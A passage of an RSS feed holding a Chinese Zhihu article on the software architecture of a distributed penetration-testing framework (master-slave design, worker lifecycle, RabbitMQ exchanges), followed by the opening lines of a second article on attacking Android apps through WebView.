&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-59d6dc5eeea4931774877903a65e57a1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文与大家探讨一些关于分布式渗透框架的架构与设计的话题，分享笔者的一些拙见，希望能对大家有所启发。本文分为三个话题（Topic），建议按顺序阅读，在三个话题中，笔者对两个痛点（架构设计与通信）做了一些细节描述。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Topic - 渗透测试框架是什么&lt;/li&gt;&lt;li&gt;Topic - 需求分析与架构设计&lt;/li&gt;&lt;li&gt;Topic - 通信与消息队列&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - 渗透测试框架是什么&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;背景&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;现在很多大小厂家或者很多私人团队都在做或者已经有成熟的扫描器，开源也好内部使用也好。都是为了解决一些实际的问题：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;渗透测试需要&lt;/li&gt;&lt;ul&gt;&lt;li&gt;代替重复手动来动&lt;/li&gt;&lt;li&gt;避免遗漏发生&lt;/li&gt;&lt;li&gt;传承／继承优秀的测试方法&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;作为企业的产品之一&lt;/li&gt;&lt;ul&gt;&lt;li&gt;面向专业用户&lt;/li&gt;&lt;li&gt;面向普通用户&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;灰色产业（BOTNET）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;简单来说，渗透测试框架能让你的某些渗透测试流程变的更简单，辅助业务完成，简化一些业务逻辑。当然对于框架来说，它的基本功能其实是保证插件的正常运行。当他拥有了很多的插件的时候，价值才会真正体现出来。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;本质&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;渗透测试框架并不是什么特别高深的东西，相比电商系统中的微服务架构，可能基础架构并没有它复杂，甚至相比之下可以说是小巫见大巫了。但是渗透测试框架也并不适合和微服务架构进行对比，因为它更加的灵活，一些高级开发概念（分布式／微服务），对他并不是特别适用。一个渗透测试框架／扫描器，可以非常简洁明了，甚至可以看成一个灵活的脚本引擎，但是同时又存在着很多的大型的渗透框架／扫描框架（Nessus／OpenVAS），这些框架的复杂程度远远高于普通的脚本引擎。说渗透测试框架／扫描器的本质，并不好根据他的特征说具体它是一个什么样的程序：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;一个单机运行／分布式的程序框架&lt;/li&gt;&lt;li&gt;高质量的扫描模块，或者灵活的脚本引擎&lt;/li&gt;&lt;li&gt;稳定的基础设施，逻辑可编程控制&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;解决的问题&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;代替某些重复的手工劳动&lt;/li&gt;&lt;li&gt;固定逻辑输出&lt;/li&gt;&lt;li&gt;稳定的输出&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;不能解决的问题&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;带有复杂逻辑的漏洞无法检测&lt;/li&gt;&lt;li&gt;分布式渗透框架设计与实现难度高&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;普适性的规则&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于一个这种框架来说，再简化简化简化模型，它最终会变成一个 RPC（Remote Procedure Call）调用多种程序（功能单元）的框架，当然这里不是说具体的 RPC 协议，而是一个泛化的 RPC 的概念；或者变成一个直接调用多种程序（功能单元）的框架。&lt;/p&gt;&lt;p&gt;与普通 RPC 最大的差别就是：任务种类多样，任务可能存在更新的情况，执行任务环境非常复杂。而且框架本身需要支持高度灵活的功能单元（插件）。或者用另一句话来说，被调用的程序（功能模块）对于框架来说，是非常非常松散的，甚至失效／过时都不会影响任何框架的运行。&lt;/p&gt;&lt;p&gt;这样来说，它又不能简单的说是一个 RPC，基于上述的情形，他在设计的时候，排除后期模块注册等机制，框架本身是不能主动知道他会有多少种类，多少数量的程序可以让他在远程调用，同时也不知道这些程序的基础接口到底是什么。因此用 RPC 来描述，又不是特别恰当。&lt;/p&gt;&lt;p&gt;那么，在对于框架来说，我们最好采用哪种形式来描述？当然，每个人有每个人的看法，我更偏向于使用 &lt;b&gt;松散的主从架构（Loose Master-Slave）&lt;/b&gt; 这样的描述来作为这类框架的架构模型：自然 Slave 表示功能单元或者被调用的程序，Master 则代表控制器／调用者或者整体事务逻辑处理的节点，Loose 则代表了 Slave 和 Master 之间的关系，相互的依赖性不是特别的强，可以采用其他的机制来维护他们之间的联系，比如注册或订阅机制等。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;补充说明&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然框架和渗透测试工具是不一样的，工具大可直接使用分层架构，甚至可以不用太注意项目模型和结构相关的部分，直接面向过程实现某一些特定功能，或者部分或者整体使用微内核架构提供一定的灵活性。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;现主流扫描器／框架的模型分类&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;单机与分布式：本文中单机与分布式的最大的区别不是是否联网，而是具体的执行任务的工作节点是否在一台机器上。&lt;/li&gt;&lt;li&gt;微内核架构：这种架构非常灵活，既可以作为部分也可以作为整体框架使用。比如常见的脚本引擎：Nmap 的 NSE 系统，SQLMAP 的 Tamper 机制等等，其实可以说用到了微内核模型的一些思想。&lt;/li&gt;&lt;li&gt;微内核与主从：微内核采用主从模型，在一定程度上解耦功能模块。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8c583d205528f259751b8ca0dda81fcc_r.png&quot; data-rawwidth=&quot;1462&quot; data-rawheight=&quot;762&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在下一个话题中，我们讨论分布式渗透框架／扫描器的架构设计相关的话题。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - 需求分析与架构设计&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;背景&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;简单来说这个框架的任务就是，接收任务，分发任务，执行任务，处理结果，因此分布式渗透测试框架相对于电商平台的微服务架构要简单很多，因为渗透测试框架的事务相对更佳简单一些，甚至可以说淡化事务这个概念。但是又属于任务密集型的应用，一定程度上高并发和高可用性又存在一定的需求。&lt;/p&gt;&lt;p&gt;我们可以从头梳理一下整个过程，Master 得到一个任务，这个任务被分为几个原子任务，按照种类被送给了不同的 Worker，然后任务执行之后，结果被发送会 Master，进行事务汇总。&lt;/p&gt;&lt;p&gt;整个过程虽然并不是非常的复杂，但是我们还是需要分析一下我们到底需要什么才能针对需求作出合理的架构设计&lt;/p&gt;&lt;h2&gt;&lt;b&gt;需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;思考了很多关于需求描述的方法，我们没有办法只从一个角度很好的描述我们的系统到底需要什么样的功能，这就好比我们有了 OOP，但是 AOP 的出现进行了对 OOP 非常好的补充，当然还有 SOP（面向状态编程）也对 OOP 的起到了很好的补充。啊，话题扯远了，经过一些思考，分别从空间和时间（过程／逻辑）两个角度来讨论我们的需求。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;空间角度是指对象，行为，数据，实体角度与传统的 OOP 的思考角度类似，就不做过多的赘述了。&lt;/li&gt;&lt;li&gt;时间／过程／逻辑角度指的是我们从个行为从开始到结束整个过程来思考问题，就比如，从 Master 到 Slave 通信的整个过程，一个事务的生存周期（任务从产生到结束或者被丢弃），一个模块的生存周期，一个存在主逻辑的调度过程等。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;空间需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;从功能实体的角度来说，我们大概需要这样的东西：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Master&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;事务管理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;任务接收&lt;/li&gt;&lt;li&gt;任务分发&lt;/li&gt;&lt;li&gt;结果收集&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;节点管理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;节点审计（Inspect）&lt;/li&gt;&lt;li&gt;节点启停（Start / Stop）&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;用户管理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;略&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;Slave&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;状态无关&lt;/li&gt;&lt;li&gt;事务处理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;任务执行&lt;/li&gt;&lt;li&gt;结果返回&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;节点管理&lt;/li&gt;&lt;ul&gt;&lt;li&gt;节点状态汇报&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;时间／过程／逻辑需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然这里指的是本框架中为了解决问题从而需要的一系列的机制或者可能出现的过程或者逻辑&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通信系统（稍后会详细讨论）&lt;/li&gt;&lt;li&gt;事务系统&lt;/li&gt;&lt;ul&gt;&lt;li&gt;任务管理系统&lt;/li&gt;&lt;li&gt;结果管理系统&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;功能模块引擎&lt;/li&gt;&lt;li&gt;高度模块化：指的是模块之间高度独立，极低耦合甚至没有耦合&lt;/li&gt;&lt;li&gt;使用脚本引擎提升灵活性：针对不必要新建模块的小型任务，仅使用一个脚本引擎来敏捷启动和执行任务&lt;/li&gt;&lt;li&gt;对框架的低依赖：模块按照一定规范编写而成，不需要向框架提供任何接口&lt;/li&gt;&lt;li&gt;接口统一，但是模块本身环境的多样性：模块可以是任意的语言，任意的环境，任意容器，但是模块的接口必须是框架可以接受的&lt;/li&gt;&lt;li&gt;调度系统&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;存在一个可以让模块协同工作的调度系统。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;用户接口（略）&lt;/li&gt;&lt;li&gt;框架扩展系统&lt;/li&gt;&lt;ol&gt;&lt;li&gt;任务脚本 SDK&lt;/li&gt;&lt;li&gt;关键点／关键消息队列拓展&lt;/li&gt;&lt;/ol&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;设计&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;根据我们需求，最简单的，我们整体的架构应该是一个松散的 Master-Slave 架构，Master 并不依赖任何 Slave，但是 Slave 必须依附于 Master 才可以工作。&lt;/p&gt;&lt;p&gt;在进行下面的叙述过程中，我们首先约定一下在我们的框架中要出现的几个概念：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Master - 主控实体&lt;/li&gt;&lt;li&gt;MQ 连接 Master 与 Slave 所有服务通信的中间件&lt;/li&gt;&lt;li&gt;Slave - 具体执行业务的实体&lt;/li&gt;&lt;ul&gt;&lt;li&gt;功能单元：具备一种执行任务的能力，但是只能执行一种，可以直接向 Master 汇报生存状况和结果，脱离节点也可以存在&lt;/li&gt;&lt;li&gt;节点：可以管理多个功能单元，但是不实现执行任务的接口，也并没有执行任务的能力，可以直接向 Master 汇报生存状况和结果（结果来源于功能单元）&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;好的，我们用下面这个图来简单说明一下结构&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-81d9fb3e1c608427fe039f5593543493_r.jpg&quot; data-rawwidth=&quot;2043&quot; data-rawheight=&quot;2149&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;同时，这个整体的架构并不够我们描述整个框架，也显得非常敷衍，所以我们很有必要做详细的阐述：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Master 拆分服务与子功能&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Master 是一个巨大的功能集合，但是并不是一个“牛类”这样的东西，Master 是由很多个服务构成的，因此我们非常有必要把 Master 拆分成具体的服务来分别阐述其用途。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通信服务&lt;/li&gt;&lt;li&gt;节点和模块管理服务：提供对 Slave 的管理功能&lt;/li&gt;&lt;ul&gt;&lt;li&gt;节点管理子服务&lt;/li&gt;&lt;li&gt;模块（功能单元）管理子服务&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;模块调度服务：调度模块／功能单元之间的协作逻辑&lt;/li&gt;&lt;li&gt;事务处理服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;任务处理子服务&lt;/li&gt;&lt;li&gt;结果处理子服务&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;持久化服务：存储任务和结果&lt;/li&gt;&lt;li&gt;用户服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;用户鉴权与管理（后期）&lt;/li&gt;&lt;li&gt;用户接口&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3db80851b08aec077b2bbae03bfde28e_r.png&quot; data-rawwidth=&quot;1137&quot; data-rawheight=&quot;386&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Slave 拆分服务与子功能&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;节点服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;Master 通信服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;控制信道：传递主控节点的控制信息&lt;/li&gt;&lt;li&gt;任务信道：任务接收信道&lt;/li&gt;&lt;li&gt;结果信道：结果汇报&lt;/li&gt;&lt;li&gt;汇报信道：额外信息汇报&lt;/li&gt;&lt;li&gt;…...&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;功能单元管理子服务&lt;/li&gt;&lt;li&gt;功能单元使用子服务&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;功能单元服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;接收任务&lt;/li&gt;&lt;li&gt;检查参数与合理性&lt;/li&gt;&lt;li&gt;执行任务&lt;/li&gt;&lt;li&gt;返回最终结果或者阶段性结果&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b024368c6c0474605a9cb5830deda05d_r.png&quot; data-rawwidth=&quot;544&quot; data-rawheight=&quot;403&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;其他设备&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;消息队列（集群）：在下一个 Topic 会着重探讨。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;过程设计&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;设计对应需求，我们仍然需要对重要的过程进行设计，和上面服务／功能拆分是不同的角度，但是也很好的可以描述出框架工作的过程。所以我个人觉的这个角度来做一些说明是非常有必要的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;事务处理流程&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;事务处理不论是在各种门户的微服务架构中还是在电商微服务架构都起着非常重要的作用：&lt;/p&gt;&lt;p&gt;事务的存在是为了保障任务执行的完整性和精确性，举个例子说明事务的存在的必要：当你的事情开始执行了，但是由于节点崩溃或者网络原因，没有办法成功执行这个操作，在收到执行失败的信号之后，事务会回滚到上一个安全的状态，这样就避免了 Pending 这种薛定谔状态，也是最终一致性的一种体现或者实现方法吧（当然事务控制中心我们这里只设置一个，就不存在多个事物控制中心数据的需要强同步的问题了）&lt;/p&gt;&lt;p&gt;我们在设计这个框架的时候有意将事务这个概念引入我们的框架，运用最终一致性处理事务处理&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f98323bfcc214ecf1f87e9cebc52dd6c_r.jpg&quot; data-rawwidth=&quot;2087&quot; data-rawheight=&quot;2888&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;功能单元生存周期&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然理应所有的功能实体都应该有一个状态机，但是由于篇幅所限，我们就举个简单的例子，功能单元的生存周期状态图如下&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-03f710d46c578d1afe8ae37734ac28ba_r.jpg&quot; data-rawwidth=&quot;1570&quot; data-rawheight=&quot;660&quot;&gt;&lt;p&gt;在功能单元启动之后，首先进入初始状态，进行初始化，初始化成功则进入 Prepared 状态，如果初始化失败，造成功能单元崩溃，则进入崩溃处理流程。&lt;/p&gt;&lt;p&gt;在 Prepared 状态下，功能单元自动发起注册到 Master，如果注册成功，改变状态为 Registered，如果失败，进入 Unregistered 状态。&lt;/p&gt;&lt;p&gt;Registered 状态直接进入 Working 状态，Working 状态下，会定时发送心跳（或者其他机制来保证与 Master）连接，如果发生多次连接断开，则进入 Unregistered 状态。同时在 Working 状态下进行事务处理（略）。如果事务处理过程中程序遭遇到不可解决的崩溃，则进入 Crashed 状态。&lt;/p&gt;&lt;p&gt;Crashed 状态下，我们需要重置功能单元决定是停止功能单元，还是重启。&lt;/p&gt;&lt;p&gt;Unregistered 状态会自动关闭功能单元，因为 Unregistered 是一个标志着功能单元正常结束的单元。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在上一个话题中，我们关于消息队列（通信）的部分并没有做太多的描述，接下来我们就在下一个话题中具体阐述一下关于节点通信的问题。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - 通信与消息队列&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本部分与大家简单探讨本框架的架构与消息队列的关系和对消息队列的设计。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;消息队列基础&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;参考资料：&lt;a href=&quot;https://tech.meituan.com/mq-design.html&quot;&gt;https://tech.meituan.com/mq-design.html&lt;/a&gt;&lt;br&gt;RabbitMQ: &lt;a href=&quot;https://www.rabbitmq.com/reliability.html&quot;&gt;https://www.rabbitmq.com/reliability.html&lt;/a&gt;&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;必要性&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于我们的渗透测试系统，消息队列真的是必须的么？我个人的回答是必须的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;主要特性：解决服务（模块）通信问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通信不仅仅是 “我发送，你收到” 这么简单的事情。从本文框架的架构整体上来说，是一个 &lt;b&gt;Master / Slaves&lt;/b&gt; 的架构模式，也就是说一个 Master 和多个 Slaves 同时进行通信，当然通信的种类也多种多样：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;任务分发通信（多对多）：Master 向 Slaves 分发任务，这个通信模型更像是一个 &lt;b&gt;Producer / Consumer&lt;/b&gt; 的模式，这很好理解，Master 发送任务，Slaves 执行，我们自然保证并不想多个 Slave 同时来做一个任务，这样就白白浪费了资源。&lt;/li&gt;&lt;li&gt;通知与订阅消息通信（一对多）：可以简单想象一下广播与组播的需求，这种通信模型我们可以暂且称之为 &lt;b&gt;FanOut&lt;/b&gt; 吧。其实这也非常好理解，当你的 Master 想要发送一个通知消息，这个消息可能是针对全体的 Slaves 的，这样最合适的办法就是使用广播通信模式；同样的，当你的 Master 想要针对某一个组发送通知（例如关闭所有的爬虫模块组，升级某一个组的数据库，或者更新代码，部署新的功能），这类通知你是不希望被其他无关组或者无关节点收到的。针对这些情况，FanOut 可以很好解决。&lt;/li&gt;&lt;li&gt;点对点（一对一）：这里主要不涉及 Slave 与 Slave 的通信，我们的架构似乎并不喜欢 Slave 与 Slave 之间有联系，这样会极大增加耦合度和复杂度；但是 Master 到 Slave 的单点通信时必须要有的，因为我们经常会需要单独告诉一个 Slave 应该干啥（关闭 Slave，重启 Slave 甚至 升级 Slave）&lt;/li&gt;&lt;li&gt;结果汇报与生存状况汇报（多对多）：作为无状态的 Slave，完成一个任务的第一件事，应该就是把任务传回 Master；当然，作为 Master，是有必要知道 Slave 的一些生存状况的，除了主动问询的方法之外，Slave 还应该主动向 Master 进行汇报；同时，Slave 的关键部分挂掉了，错误信息／日志，也应该传回 Master…… 这样的需求其实一点都不过分，我们需要一个 &lt;b&gt;FanIn&lt;/b&gt; 的模型去解决这种问题。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;次要特性：可靠性／安全性&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;可靠性：在正常工作的条件下，你的通信两端拿到的数据是无差别的不会出现数据的差别，并且不会无故丢失数据，出现不期望的数据。你可以信赖你的数据来源。&lt;/li&gt;&lt;li&gt;安全性：不希望数据被别人截取造成信息泄漏，或者因为反序列化漏洞造成 RCE，或者命令注入，或者未知的风险，通信需要支持 SSL &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;而一个可靠的消息队列，它本身会有一整套的机制保证消息从一端到另外一端是可靠的，你可以不必担心你的消息在通信的过程中丢失／在消息队列中丢失（因为机器重启或其他不可预料的因素）。我们以 RabbitMQ 做例子，举例一下 RabbitMQ 在数据可靠性和一致性上做的一些工作：&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;Ensuring Messages are Routed&lt;/b&gt;&lt;br&gt;In some circumstances it can be important for producers to ensure that their messages are being routed to queues (although not always - in the case of a pub-sub system producers will just publish and if no consumers are interested it is correct for messages to be dropped).&lt;br&gt;确保消息一定是被路由处理的：在绝大多数情况下，RabbitMQ 都可以让生产者确认消息通过路由已经被传递进了消息队列中（除了没有订阅者的 &lt;b&gt;发布-订阅&lt;/b&gt; 系统）&lt;br&gt;&lt;br&gt;&lt;b&gt;At the Consumer&lt;/b&gt;&lt;br&gt;In the event of network failure (or a node crashing), messages can be duplicated, and consumers must be prepared to handle them. If possible, the simplest way to handle this is to ensure that your consumers handle messages in an idempotent way rather than explicitly deal with deduplication.&lt;br&gt;在节点崩溃或者网络错误的时候，消息可能会出现重复，与此同时消费者必须对重复有解决办法。如果想解决这个问题，最简单的方法就是使用幂等这种方法（而不是直接处理）。&lt;br&gt;&lt;br&gt;If a message is delivered to a consumer and then requeued (because it was not acknowledged before the consumer connection dropped, for example) then RabbitMQ will set the redeliveredflag on it when it is delivered again (whether to the same consumer or a different one).&lt;br&gt;... &lt;br&gt;Conversely if the redelivered flag is not set then it is guaranteed that the message has not been seen before. Therefore if a consumer finds it more expensive to deduplicate messages or process them in an idempotent manner, it can do this only for messages with the redeliveredflag set.&lt;br&gt;如果一个已经被送到了接收方，但是因为没有 ACK，消息会被重新进入消息队列；但是如果你想让消息再回到这个没有 ACK 的接受方，你需要向让你的消息设置一个 &lt;b&gt;Redeliveredflag&lt;/b&gt;，如果这样的话，你的接收方会重新接受到那个没有 ACK 的信息。&lt;br&gt;…&lt;br&gt;反过来说如果 redelivered flag 没有被设置的话，就可以确保你接收方都不会受到重复的消息了。因此吧，我们其实并不是必须在应用业务层进行幂等方法，可以简单的使用消息队列的这个特性。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;选型（可编程的协议 - RabbitMQ）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在这里选择 RabbitMQ 作为我们消息队列支持，接下来结合 RabbitMQ 的特征和我们的框架特性，我们可以尝试简单设计一下关键的消息队列结构。其实对于我们的 RabbitMQ 来说，消息队列的设计也会相当愉快，我们的发送方其实是不知道接收方具体的消息队列的，消息队列其实只是一个存在于接收方的概念。在发送方，只有交换机和路由的概念。所以我们可以使用不同交换机的种类配合路由来实现。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;交换机&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 RabbitMQ 中，交换机有四种类型：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Direct Exchange（直连交换机）：由 routing_key 提供一对一的直连服务，这样就可以解决 Master 到单个节点或者功能单元的问题。&lt;/li&gt;&lt;li&gt;Fanout Exchange（扇出交换机） ：提供一（一个交换机）对多的消息交换服务，可以解决 Master 到所有节点的通知问题，但是这个需求实际上并不是特别的必要（除了整个系统在进行大的升级／关闭的时候），并不是非常常用。&lt;/li&gt;&lt;li&gt;Topic Exchange（主题交换机） ：这个其实也可以说是和 Fanout Exchange 有一点类似，只要订阅了一个主题就可以收到这个主题的相关信息了，当然订阅主题的方法也十分灵活。我们可以通过这个交换机，向各个组／ 类型／具有某个预设特征的功能单元或者节点发送消息。&lt;/li&gt;&lt;li&gt;Header Exchange（首部交换机） ： Direct Exchange 的另外一种表现形式，只是不是使用 routing_key 进行路由的，是由本身的一个 headers 来控制的。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;根据这四种类型的交换机，我们很容易设计出我们的通信系统。（当实际的使用，我们并不会全部选择）&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-2302768d687ada1e47bb8424401f393a_r.jpg&quot; data-rawwidth=&quot;1744&quot; data-rawheight=&quot;1286&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;下面依次对几个交换机做简要说明：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;任务分发交换机（ Direct Exchange ），每一种类型的任务是一个路由键，节点需设置这个路由键才能收到任务。在客户端，每一类型的功能单元要设置相同的路由键（类型名），才可以接收到任务&lt;/li&gt;&lt;li&gt;结果收集交换机（ Topic Exchange ），日志记录系统和审计系统或者其他系统都可以通过这个结果收集交换机订阅到自己想要查看的结果。同样，如果开发新的服务或者模组也可以通过订阅结果交换机去获取任务执行的结果。&lt;/li&gt;&lt;li&gt;控制交换机（ Direct Exchange ），直接管理节点的行为（启动／停止／更新），当然这个控制交换机的路由键为这个节点的 GUID 或 UUID，这样可以实现 Master 到 Slave 的单点链接。&lt;/li&gt;&lt;li&gt;通知交换机（ Topic Exchange ），按功能单元的类型分组，控制交换机的批量操作（对某一种类型的功能单元进行更新数据库，热补丁／批量关闭）。&lt;/li&gt;&lt;li&gt;反馈交换机（ Topic Exchange ），同结果交换机。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;其中，任务分发和结果收集是属于事务（任务）管理服务的，控制／通知／反馈交换机是属于节点（功能单元）管理服务的。这样我们可以把管理与业务，通过消息队列进行完美分离。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上文描述了一个分布式渗透框架该有的部分，但是限于篇幅，我们没有办法把每一个部分都的设计思路都描述清楚。笔者能力有限，文中如有纰漏，希望读者不吝赐教。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;PS: 知乎的编辑器莫名其妙粒子态吃掉列表的 Tab 导致列表出现格式 Bug，笔者经过尝试无法修好 😢&lt;/p&gt;</description>
<author>v1ll4n</author>
<guid isPermaLink="false">2017-08-25-28781870</guid>
<pubDate>Fri, 25 Aug 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>通过 WebView 攻击 Android 应用</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-26-28107901.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;通过 WebView 攻击 Android 应用&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28107901&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-be9ee8b4483f67962aecb8f34a82ed65_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;WebView 可在应用中嵌入一个内置的 Web 浏览器，是 Android 应用开发常用的组件之一。通过 WebView 对 Android 应用的攻击案例屡见不鲜，比如几年前就被玩坏的 addJavascriptInterface 远程代码执行。但修复了 addJavascriptInterface 并不表示就能高枕无忧。应用在 WebView 上为 Javascript 提供的扩展接口，可能因为接口本身的问题而变成安全漏洞。&lt;/p&gt;&lt;p&gt;除此之外，在没有启用进程隔离的 WebView 与 App 具有相同权限，获得任意代码执行后可以访问应用私有数据或其他系统接口，可以将浏览器漏洞移植到手机平台上对应用进行针对性攻击。部分厂商使用自行基于开源浏览器引擎 fork 而来的内核，也可能因为同步上游补丁代码不及时而出现可利用的漏洞。&lt;/p&gt;&lt;p&gt;在 Android N 中增加了一个开发者选项，就是在所有的应用中将 WebView 的渲染进程运行在独立的沙箱中。即使恶意网页通过漏洞在渲染进程中执行了代码，还需要更多的漏洞绕过沙箱的限制。这一特性将&lt;a href=&quot;https://developer.android.com/preview/behavior-changes.html#security-all&quot;&gt;在 Android O 中默认启用&lt;/a&gt;。但在这一缓解措施正式部署到大部分设备之前，通过攻击 WebView 获得远程代码执行进而直接攻击应用仍然是可行的。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-51e68d06636afabcdb96e97fcc7aa8ca_r.png&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1144&quot;&gt;&lt;h2&gt;Beyond addJavascriptInterface&lt;/h2&gt;&lt;p&gt;本文并不打算炒 addJavascriptInterface 的冷饭，而是关注在接口本身的实现上。&lt;/p&gt;&lt;p&gt;即使是使用了相对安全的通信手段（如 shouldOverrideUrlLoading 或 onJsAlert 